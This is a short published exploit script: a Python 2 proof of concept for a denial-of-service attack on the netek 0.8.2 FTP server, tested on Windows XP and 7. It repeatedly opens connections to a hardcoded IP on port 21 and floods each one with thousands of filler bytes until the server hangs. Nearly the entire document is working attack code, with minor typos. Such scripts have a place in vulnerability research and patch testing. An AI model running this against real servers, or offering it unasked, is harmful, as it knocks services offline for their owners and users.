# Exploit Title : netek 0.8.2 FTP Denial of Service
# Test on : windowsXPs3 + windows 7
# software Link :https://sourceforge.net/projects/netek.berlios/
# version : 0.8.2
# author : Lawrence Amer
# site : lawrenceamer.me
# affected product uses default port 30817 , it can be chnaged also
# !/bin/python
import socket

ip = "192.168.245.135"

sarr = []
i = 0
while True:
    try:
        sarr.append(socket.create_connection((ip, 21)))
        print "[+] Connection %d" % i
        crash1 = "\x41" * 5000 + "\X42" * 1000
        sarr[i].send(crash1 + '\r\n')
        i += 1
    except socket.error:
        print "[*] Server crashed with CPU 100!!"
        raw_input()
        break